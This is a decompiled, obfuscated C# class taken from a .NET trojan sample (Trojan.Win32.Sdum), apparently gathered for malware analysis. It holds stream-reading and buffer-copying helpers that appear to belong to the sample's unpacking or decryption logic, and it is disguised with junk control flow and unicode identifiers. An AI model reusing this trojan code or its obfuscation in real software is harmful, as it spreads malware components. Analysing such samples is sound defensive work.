// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Vqblspvdqljhpsgi, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FE8081E8-66FB-4850-FD50-A5695502DCE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\VHO-Trojan.Win32.Sdum.gen-9fc4a8a3b82ca7cc67d3b4eed5450d9c6ff148924beec86be1b3178754f4b645.exe

using System;

internal sealed class \u0006\u2007 : \u0008\u2007
{
  public \u0006\u2007(byte[] _param1, long _param2)
  {
    if (true)
      ;
    byte[] numArray = _param1;
    if (true)
      ;
    long num = _param2;
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector(numArray, num);
  }

  public byte[] \u0002(\u0005\u2004 _param1, \u000F\u2006 _param2)
  {
    byte[] numArray1 = new byte[4];
    if (true)
      goto label_4;
label_1:
    \u0005\u2004 obj = _param1;
    byte[] src1;
    byte[] numArray2 = src1;
    int? nullable = new int?(src1.Length);
    if (true)
      goto label_5;
label_2:
    int num1 = \u0008\u2007.\u0002(this.\u0002(src1, false), 0);
    if (true)
      goto label_6;
label_3:
    int length1;
    int length2 = \u0008\u2007.\u0003(length1);
    int num2 = length2 - 4;
    byte[] dst1 = new byte[length2];
    \u0006\u2007.\u0002(_param1, dst1, 4, new int?(num2));
    Buffer.BlockCopy((Array) src1, 0, (Array) dst1, 0, 4);
    byte[] src2 = this.\u0002(dst1, false);
    byte[] numArray3 = new byte[length1];
    byte[] dst2 = numArray3;
    int count = length1;
    Buffer.BlockCopy((Array) src2, 4, (Array) dst2, 0, count);
    return numArray3;
label_6:
    length1 = num1;
    goto label_3;
label_5:
    \u0006\u2007.\u0002(obj, numArray2, 0, nullable);
    goto label_2;
label_4:
    src1 = numArray1;
    goto label_1;
  }

  public byte[] \u0002(byte[] _param1)
  {
    byte[] src = this.\u0002(_param1, false);
    int num = \u0008\u2007.\u0002(src, 0);
    if (true)
      goto label_4;
label_1:
    int length;
    byte[] numArray1 = new byte[length];
    if (true)
      goto label_5;
label_2:
    byte[] numArray2;
    byte[] dst = numArray2;
    int count = length;
    if (true)
      goto label_6;
label_3:
    return numArray2;
label_6:
    Buffer.BlockCopy((Array) src, 4, (Array) dst, 0, count);
    goto label_3;
label_5:
    numArray2 = numArray1;
    goto label_2;
label_4:
    length = num;
    goto label_1;
  }

  private static void \u0002(\u0005\u2004 _param0, byte[] _param1, int _param2, int? _param3)
  {
    int? nullable1 = _param3;
    if (true)
      goto label_2;
label_1:
    int? nullable2;
    int num1 = nullable2 ?? _param1.Length - _param2;
    int num2;
    if (true)
      num2 = num1;
    int num3;
    for (; (num3 = _param0.\u0005\u2004\u2009​\u0002(_param1, _param2, num2)) > 0; num2 -= num3)
    {
      int num4 = _param2 + num3;
      if (false)
        continue;
      _param2 = num4;
    }
    return;
label_2:
    nullable2 = nullable1;
    goto label_1;
  }
}
